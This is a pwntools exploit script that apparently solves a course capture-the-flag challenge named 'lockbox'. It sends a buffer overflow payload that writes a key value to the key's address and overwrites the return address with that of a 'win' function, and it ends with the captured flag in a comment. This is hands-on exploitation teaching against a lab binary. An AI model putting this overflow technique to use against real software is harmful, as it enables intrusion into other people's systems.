from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./lockbox"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1282
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

e = ELF(CHALLENGE)
key = 0xbeeff0cacc1a
key_addr = e.symbols.key
s = asm("endbr64 ; push rbp", arch='amd64')
win_addr = e.symbols.win + len(s)

print(p.recvuntil(b"> ").decode())
msg = b"C" * 0x10 + p64(key_addr) + p64(key) + b"C" * 0x28 + p64(win_addr)
p.sendline(msg)
log.info(f"Sending raw bytes: {msg}")
log.info(f"Recognizing the key's address as: {hex(key_addr)}")
log.info(f"Assigning the key's value as: {hex(key)}")
log.info(f"Overwriting the return address in the stack to: {hex(win_addr)}")

p.interactive()

# flag{y0u_d0n't_n33d_4_k3y_1f_y0u_h4v3_4_BOF!_bbd74b38de30e03e}
